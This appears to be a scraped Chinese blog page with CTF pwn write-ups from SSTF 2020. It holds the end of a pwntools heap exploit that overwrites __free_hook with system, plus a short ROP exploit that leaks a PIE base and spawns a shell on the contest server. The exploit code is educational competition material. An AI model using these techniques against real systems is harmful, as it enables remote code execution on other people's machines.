class="number">1337</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="literal">True</span> <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line">remote_libc = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line"></span><br><span class="line">    io = process(filename, env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: remote_libc&#125;) </span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    io = remote(ip, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params"> idx</span>):</span></span><br><span class="line">    io.sendlineafter( <span class="string">&quot;choice: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span>(<span class="params">name, val</span>):</span></span><br><span class="line">    log.info(name+<span class="string">&quot; : &quot;</span>+<span class="built_in">hex</span>(val))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"> ticket_type, data1, data2</span>):</span></span><br><span class="line">    choice( <span class="number">1</span>)</span><br><span class="line">    io.sendlineafter( <span class="string">&quot; buy?\n&quot;</span>, <span class="built_in">str</span>(ticket_type))</span><br><span class="line">    io.sendafter( <span class="string">&quot;First name: &quot;</span>, data1)</span><br><span class="line">    io.sendafter( <span class="string">&quot;Last name: &quot;</span>, data2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"> idx</span>):</span></span><br><span class="line">    choice( <span class="number">2</span>)</span><br><span class="line">    io.sendlineafter( <span class="string">&quot;Index of ticket: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params"> idx, op=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    choice( <span class="number">3</span>)</span><br><span class="line">    io.sendlineafter( <span class="string">&quot;Index of ticket: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">if</span> op != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        io.sendlineafter( <span class="string">&quot;1) meal 2) safari 3) gift 4) ride\n&quot;</span>, op)</span><br><span class="line"></span><br><span class="line">add( <span class="number">1</span>, <span class="string">&#x27;/bin/sh\n&#x27;</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add( <span class="number">1</span>, <span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;aaa\n&#x27;</span>)</span><br><span class="line">add( <span class="number">1</span>, <span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;aaa\n&#x27;</span>)</span><br><span class="line">add( <span class="number">1</span>, <span class="string">&#x27;/bin/sh\n&#x27;</span>, <span class="string">&#x27;aaa\n&#x27;</span>)</span><br><span class="line">rm( <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">rm( <span class="number">1</span>)</span><br><span class="line">rm( <span class="number">0</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">rm( <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show( <span class="number">1</span>)</span><br><span class="line">io.recvuntil( <span class="string">&quot;|name |  &quot;</span>)</span><br><span class="line">heap_addr = u64(io.recv( <span class="number">6</span>) + <span class="string">b&#x27;\0\0&#x27;</span>)</span><br><span class="line">lg(<span class="string">&quot;heap_addr&quot;</span>, heap_addr)</span><br><span class="line"></span><br><span class="line">show( -<span class="number">8</span>)</span><br><span class="line">io.recvuntil( <span class="string">&quot;|name |  &quot;</span>)</span><br><span class="line">io.recv( <span class="number">9</span>)</span><br><span class="line">libc_addr = u64(io.recv( <span class="number">6</span>) + <span class="string">b&#x27;\0\0&#x27;</span>)</span><br><span class="line">lg(<span class="string">&quot;libc_addr&quot;</span>, libc_addr)</span><br><span class="line"></span><br><span class="line">libc.address = libc_addr - <span class="number">0x1ec723</span></span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;libc base&quot;</span>, libc.address)</span><br><span class="line"></span><br><span class="line">fh = libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add( <span class="number">1</span>, p64(fh), <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add( <span class="number">1</span>, p64(fh), <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add( <span class="number">1</span>, p64(system), <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rm( <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Eat-the-pie"><a href="#Eat-the-pie" class="headerlink" title="Eat the pie"></a>Eat the pie</h2><p>32位程序, 开了pie. 栈上有函数指针, 因为输入结尾没有用 <code>\0</code> 截断所以是可以以leak 代码段地址的. 我tm又没看到. 这道不算什么. 问题是之后的构造过程也没构造出来. 思路太僵化了. 赛后看了一下别的队的题解, 就是先跳到 read 构造一个 rop chain 再通过 rop 执行 system(“sh”).</p>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;./eat_the_pie&quot;)</span></span><br><span class="line">io = remote( <span class="string">&quot;eat-the-pie.sstf.site&quot;</span> , <span class="number">1337</span> )</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Select &gt; &quot;</span>, <span class="string">&quot;4&quot;</span>*<span class="number">15</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;4&quot;</span>*<span class="number">15</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">tmp = io.recv(<span class="number">4</span>)</span><br><span class="line">elf_base = u32(tmp) - <span class="number">0x74d</span></span><br><span class="line">print(<span class="string">&quot;elf base&quot;</span>, <span class="built_in">hex</span>(elf_base))</span><br><span class="line"></span><br><span class="line">g1 = elf_base + <span class="number">0x970</span></span><br><span class="line">io.sendafter(<span class="string">&quot;Select &gt; &quot;</span>, <span class="string">&quot;-1 dabcdabcd&quot;</span>+p32(g1))</span><br><span class="line"></span><br><span class="line">PebpR = elf_base + <span class="number">0x00000a9b</span></span><br><span class="line">system = elf_base + <span class="number">0x5a0</span></span><br><span class="line">sh_str = elf_base + <span class="number">0x31a</span></span><br><span class="line"></span><br><span class="line">payload = flat(system, <span class="string">&#x27;aaaa&#x27;</span>, sh_str, <span class="string">&#x27;aaaa&#x27;</span>, PebpR)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure>


<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>周日刚做出一道堆题就开始洋洋得意了, 结果这次连两道贼基础的题目都没做出来. 太菜了, 不要再飘飘然忘乎所以了, 老老实实刷题吧.</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a target="_blank" rel="noopener" href="https://playground.sstf.site/challenges">比赛平台</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/theori-io/ctf/blob/master/SSTF%20CTF%202020%20Write%20Up%20-%20The%20Duck.pdf">参考题解</a></li>
<li><a target="_blank" rel="noopener" href="https://ctftime.org/event/1107">ctf-time</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/08/16/2020-00-00-n-2020-qwb-wp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/20255635">
      <meta itemprop="name" content="wxk1997">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wxk1997's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/08/16/2020-00-00-n-2020-qwb-wp/" class="post-title-link" itemprop="url">2020 强网杯线上赛部分pwn题writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-08-16 00:00:00" itemprop="dateCreated datePublished" datetime="2020-08-16T00:00:00+08:00">2020-08-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-09-16 16:33:54" itemprop="dateModified" datetime="2020-09-16T16:33:54+08:00">2020-09-16</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="wxk1997"
      src="https://avatars0.githubusercontent.com/u/20255635">
  <p class="site-author-name" itemprop="name">wxk1997</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">18</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">21</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/pullp" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;pullp" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:weixiankui1997@gmail.com" title="E-Mail → mailto:weixiankui1997@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="http://yoursite.com/" title="http:&#x2F;&#x2F;yoursite.com" rel="noopener" target="_blank">Title</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">wxk1997</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>

<script src="/js/utils.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
